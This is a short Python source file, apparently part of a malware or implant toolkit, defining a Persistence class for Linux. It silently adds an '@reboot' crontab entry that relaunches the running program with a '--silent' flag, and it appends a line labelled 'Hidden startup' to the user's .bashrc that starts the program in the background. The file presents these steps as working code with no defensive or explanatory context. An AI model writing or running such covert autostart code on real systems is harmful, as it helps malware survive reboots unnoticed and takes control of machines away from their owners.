import os
import sys
import subprocess
from pathlib import Path

class Persistence:
    @staticmethod
    def install():
        """Install persistence mechanisms"""
        if sys.platform.startswith('linux'):
            Persistence._linux_persistence()
        else:
            print("Unsupported OS for persistence")

    @staticmethod
    def _linux_persistence():
        try:
            # Get current executable path
            exe_path = os.path.abspath(sys.argv[0])
            
            # Add to crontab
            cron_cmd = f"(crontab -l 2>/dev/null; echo \"@reboot {exe_path} --silent\") | crontab -"
            subprocess.run(cron_cmd, shell=True, check=True)
            
            # Add to .bashrc
            bashrc = Path.home() / '.bashrc'
            with bashrc.open('a') as f:
                f.write(f"\n# Hidden startup\n{exe_path} --silent &\n")
                
            print("Persistence installed successfully")
        except Exception as e:
            print(f"Persistence installation failed: {e}")